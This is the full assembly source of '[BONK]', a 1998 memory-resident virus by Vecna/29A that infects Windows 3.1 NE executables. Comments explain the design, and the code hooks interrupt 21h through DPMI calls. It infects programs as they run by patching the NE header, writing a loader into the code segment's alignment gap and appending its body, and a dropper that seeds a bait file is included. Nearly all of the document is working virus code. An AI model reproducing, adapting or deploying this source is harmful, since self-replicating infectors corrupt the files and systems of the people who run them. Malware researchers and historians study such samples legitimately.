   ;[BONK] Resident NE infector
   ;Copyright 1998 (c) Vecna
   ;
   ;This virus is a resident New Exe infector, infecting files for Windows 3.1x.
   ;The virus add a loader in the gap caused by sector alignment in the entry
   ;code segment, and the rest of the virus as a overlay in the end of file. It
   ;infect and goes memory resident using DPMI calls, and not API calls, like
   ;lesser infectors. We avoid the mediation of Windows, and talk directly with
   ;DPMI, our real host.
   ;
   ;When a infected file is executed, the virus loader take control. It first
   ;check for a already resident copy, then alloc some DPMI memory, creating the
   ;apropriated descriptors. The host file is open(the name of the host is stored
   ;at infection time, so, if it is renamed, the virus cant go memory resident)
   ;and the virus body is read to the allocated memory. Then the execution
   ;continue in the allocated memory, that hook interrupt 0x21, putting the
   ;original vector in the interrupt 0xFF.
   ;
   ;The virus hook check for self check and file execute. When a file is executed,
   ;the name is stored in the buffer, and the file is checked. Attributes, date
   ;and time are saved and restored after infection. To be infected, the file
   ;must have a NE header, not be a DLL, dont have more than 512 relocations in
   ;the code section, and have enought space to add the loader. The infected
   ;files are marked with the id string 1234h in the checksum field of the NE
   ;header. The gangload is killed, and this flag is reset.

   .model tiny
   .386
   .code

   org 0

   virsize  = vend - vstart
   virmsize = mend - vstart
   lsize    = lend - lstart

   vstart equ this byte

   infectdsdx:
          pusha
          mov ax, 4300h
          int 21h
          jc er1
          push cx                                 ;save attr
          push dx                                 ;save name
          mov ax, 4301h
          xor cx, cx
          int 21h                                 ;zero attr
          jc er2
          mov ax, 3d02h
          int 21h                                 ;open file R/W
          jc er2
          mov bx, ax
          mov ax, 5700h
          int 21h
          jc er3
          push cx                                 ;save date/time
          push dx
          mov ah, 3fh
          mov cx, 40h
          mov dx, offset doshdr
          mov si, dx
          int 21h                                 ;read dos header
          jc er4
          cmp word ptr [si], 'ZM'
          jne er4                                 ;exit if not a EXE
          mov ax, 4200h
          sub cx, cx
          mov dx, [si+3ch]
          mov [nestart], dx
          int 21h                                 ;seek new header
          mov dx, si
          mov ah, 3fh
          mov cx, nesize
          int 21h                                 ;read new header
          cmp [nemarker], 'EN'
          jne er4                                 ;exit if a NE file
          mov ax, 1234h
          cmp word ptr [necrc], ax
          mov word ptr [necrc], ax
          je er4                                  ;exit if already infected
          mov cx, [nesegtableshift]
          mov ax, 1
          shl ax, cl                              ;num of bytes is sector
          cmp ax, lsize
          jbe er4                                 ;sector too small
          mov [segsize], ax
          mov al, [netargetos]
          cmp al, 2
          je okOS
          cmp al, 4
          jne er4                                 ;no win prog
   okOS:
          mov al, [neapp_flags]
          test al, 80h                            ;DLL?
          jnz er4
          mov cx, 8
          mov ax, word ptr [necsip+2]
          dec ax
          mul cl
          add ax, [nesegtableofs]
          add ax, [nestart]
          mov dx, ax
          mov [segtable], ax                      ;save CODE entry table offset
          mov ax, 4200h
          xor cx, cx
          int 21h
          mov ah, 3fh
          mov dx, offset csentry
          mov si, dx
          mov cx, 8
          int 21h                                 ;read CODE entry table
          xor dx, dx
          mov ax, [segsize]
          mul [nesegsectorofs]
          add ax, [nesegfileimagesz]
          mov dx, 4200h
          xchg ax, dx
          sub cx, cx
          int 21h                                 ;seek end of code in section
          push ax
          push dx                                 ;save insert pos
          mov ax, [nesegfileimagesz]
          xchg ax, word ptr [necsip]
          mov [oldentry], ax                      ;set new IP and save old
          sub ax, ax
          mov [negangloadofs], ax
          mov [negangloadsize], ax                ;reset gangload area
          and [neotherflags], not 1000b
          test [nesegattr], 100000000b
          jz norelocs
          mov ah, 3fh
          mov cx, 2
          mov dx, offset n_relocs
          int 21h                                 ;read num of relocs
          mov cx, word ptr [n_relocs]
          shl cx, 3
          mov [szreloc], cx                       ;size in bytes of reloc info
          cmp cx, 512*8
          ja pop2                                 ;too much for our buffer
          mov ah, 3fh
          mov dx, offset relocs
          int 21h                                 ;read relocs
   norelocs:
          mov ax, 4201h
          cwd
          sub cx, cx
          int 21h                                 ;get current pos
   analise:
          mov cx, [segsize]
          div cx
          sub cx, dx
          cmp cx, lsize                           ;enought space for us
          pop cx
          pop dx
          jb er4
          mov ax, 4200h
          int 21h
          mov ah, 40h
          mov dx, offset lstart
          mov cx, lsize
          int 21h                                 ;write virus loader
          test [nesegattr], 100000000b
          jz writevirus
          mov ah, 40h
          mov dx, offset n_relocs
          mov cx, [szreloc]
          add cx, 2
          int 21h                                 ;write reloc info
   writevirus:
          mov ax, 4202h
          cwd
          sub cx, cx
          int 21h                                 ;seek to eof
          mov ah, 40h
          mov cx, virsize
          sub dx, dx
          int 21h                                 ;write virus code
          mov ax, 4200h
          xor cx, cx
          mov dx, [nestart]
          int 21h                                 ;seek NE header position
          mov ah, 40h
          mov dx, offset nehdr
          mov cx, nesize
          int 21h                                 ;write NE header
          mov ax, 4200h
          xor cx, cx
          mov dx, [segtable]
          int 21h                                 ;seek pos of CODE entry table
          mov dx, offset csentry
          add [nesegfileimagesz], lsize
          add [nesegmemimagesize], lsize          ;fix CODE entry table
          mov ah, 40h
          mov cx, 8
          int 21h                                 ;write CODE entry table
          jmp er4
   pop2:
          add sp, 4                               ;restore stack in error
   er4:
          pop dx
          pop cx
          mov ax, 5701h
          int 21h                                 ;restore date/time
   er3:
          mov ah, 3eh
          int 21h                                 ;close file
   er2:
          pop dx
          pop cx
          mov ax, 4301h
          int 21h                                 ;restore attr
   er1:
          popa
          ret

          db 13d
          db '[BONK] by Vecna/29A (c) 1998', 13d
          db 'New technology for old header formats...', 13d

   lstart:
          pusha
          mov ax, 'BO'
          int 21h
          cmp ax, 'NK'
          je installed
   noinstalled:
          push ds
          push es
          push cs
          call over
   return:
          pop es                                  ;a retf in mem bring us here
          pop ds
   installed:
          popa
          push 1234h
   oldentry equ word ptr $-2
          ret
   baderror:
          add sp, 1*2
   reallybad:
          add sp, 5*2
          jmp return
   over:
          mov ax, 501h
          mov cx, virmsize
          xor bx, bx
          push bx
          push cx
          push bx
          push cx
          int 31h                                 ;alloc memory
          jc baderror
          push bx cx
          sub ax, ax
          mov cx, 1
          int 31h                                 ;create descriptor
          mov bx, ax
          mov ax, 7
          pop dx cx
          int 31h                                 ;set descriptor base
          mov ax, 8
          pop dx
          pop cx
          int 31h                                 ;set descriptor limit
          mov ax, 9
          mov cx, 255
          int 31h                                 ;set acess rights to code
          pop dx
          pop cx
          push bx
          push offset continue_high
          push dx
          push cx
          mov ax, 0ah
          int 31h                                 ;get alias to code
          pop cx
          pop dx
          mov bx, 8h
          xchg bx, ax
          int 31h                                 ;set limit of data descriptor
          push bx
          call over_name
   fname  db 13 dup (0)
   over_name:
          pop dx
          push cs
          pop ds
          mov ax, 3d00h
          int 21h                                 ;open host
          jc reallybad
          xchg ax, bx
          mov ax, 4202h
          mov cx, -1
          mov dx, -virsize
          int 21h                                 ;seek virusbody
          mov ah, 3fh
          pop ds
          xor dx, dx
          mov cx, virsize
          int 21h                                 ;read main virus body
          retf                                    ;jmp to overlay part
   lend:

   vinto  db 0

   int21:
          cmp byte ptr cs:[vinto], 1
          je doold
          cmp ax, 'BO'                            ;selfcheck?
          jne noselfcheck
          mov ax, 'NK'
          iret
   noselfcheck:
          pusha
          push ds
          push es
          cmp ax, 4b00h
          jne no_exec                             ;infect on EXECUTE
          push dx
          mov ax, 0ah
          mov bx, cs
          int 31h
          jc no_exec
          mov es, ax
          mov byte ptr es:[vinto], 1              ;recursive flag
          mov bx, 8
          xchg ax, bx
          sub cx, cx
          mov dx, offset virmsize
          int 31h
          cld
          pop si
          mov dx, offset fname
   set_start:
          mov di, dx
   n_char:
          lodsb                                   ;get plain filename
          cmp al, 'a'
          jb noupcase
          cmp al, 'z'
          ja noupcase
          and al, not 20h
   noupcase:
          stosb
          or al, al
          jz end_name
          cmp al, '\'
          jne n_char
          jmp set_start
   end_name:
          push es
          pop ds
          call infectdsdx                         ;infect file
   free_ldt:
          mov byte ptr es:[vinto], 0
          mov ax, 1
          mov bx, es
          int 31h
   no_exec:
          pop es
          pop ds
          popa
   doold:
          int 0ffh                                ;exec old int21
          retf 2

   continue_high:
          mov ah, 3eh                             ;close file
          int 21h
          mov ax, 4
          push cs
          pop bx
          int 31h                                 ;lock code
          mov ax, 204h
          mov bl, 21h
          int 31h                                 ;get int21 vector
          push dx
          push cx
          mov ax, 205h
          mov bl, 21h
          mov cx, cs
          mov dx, offset int21
          int 31h                                 ;set new int21 vector
          mov ax, 205h
          mov bl, 0ffh
          pop cx
          pop dx
          int 31h                                 ;set int0ff to old int21
          mov byte ptr ds:[vinto], 0
          mov ax, 1
          mov bx, ds                              ;free data descriptor
          int 31h
          retf                                    ;return to loader

          align 16

   vend   equ this byte

   doshdr                   equ this byte
   nehdr                    equ this byte
   nemarker                 dw 0
   nelinkerversion          dw 0
   neentrytableofs          dw 0
   neentrytablesize         dw 0
   necrc                    dd 0
   neprog_flags             db 0
   neapp_flags              db 0
   neautodataseg            dw 0
   neheapsize               dw 0
   nestacksize              dw 0
   necsip                   dd 0
   nesssp                   dd 0
   nesegtablecount          dw 0
   nemodulecount            dw 0
   nenonressize             dw 0
   nesegtableofs            dw 0
   nerestableoff            dw 0
   neresnametableofs        dw 0
   nemodreftableofs         dw 0
   neimpnamestableofs       dw 0
   nenonresnametablefilepos dd 0
   nemoventrypointcount     dw 0
   nesegtableshift          dw 0
   nerestablecount          dw 0
   netargetos               db 0
   neotherflags             db 0
   negangloadofs            dw 0
   negangloadsize           dw 0
   nesize                   equ $ -offset nehdr

   csentry                  equ this byte
   nesegsectorofs           dw 0
   nesegfileimagesz         dw 0
   nesegattr                dw 0
   nesegmemimagesize        dw 0
   nestart                  dw 0

   segsize                  dw 0
   segtable                 dw 0
   szreloc                  dw 0
   n_relocs                 dw 0
   relocs                   db 512*8 dup (0)

   mend   equ this byte

   ;first generation dropper, just ignore
   ;infect BAIT.EXE in test dir
   dropper:
          mov ax, 3531h
          int 21h
          push es
          push bx
          push cs
          pop ds
          mov dx, offset _iret
          mov ax, 2531h
          int 21h
          push cs
          push cs
          pop es
          pop ds
          mov dx, offset fname1
          mov ax, 4b00h
          call int21
          pop dx
          pop ds
          mov ax, 2531h
          int 21h
          mov ax, 4c00h
          int 21h
   _iret:
          mov ax, cs
          iret

   fname1 db 'c:\lixo\bait.exe',0

   end    dropper
